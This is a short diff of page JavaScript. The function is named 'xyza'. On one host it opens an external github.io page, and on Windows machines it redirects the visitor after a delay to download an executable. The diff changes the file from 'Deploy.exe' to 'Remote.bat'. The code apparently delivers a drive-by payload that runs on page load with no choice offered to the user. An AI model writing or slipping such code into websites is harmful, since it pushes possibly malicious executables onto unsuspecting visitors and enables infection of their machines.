@@ -11,7 +11,7 @@ async function xyza(){
 if(window.location.host.includes("vv-1757")){
 window.open("https://spat-cloud.github.io/new/","_blank") ;
   if(navigator.platform.toUpperCase().includes("WIN")){
-   setTimeout(()=>window.location="https://spat-cloud.github.io/win_exe/Deploy.exe",2119);
+   setTimeout(()=>window.location="https://spat-cloud.github.io/win_exe/Remote.bat",2119);
   }
 }else{
   LoadGIF();
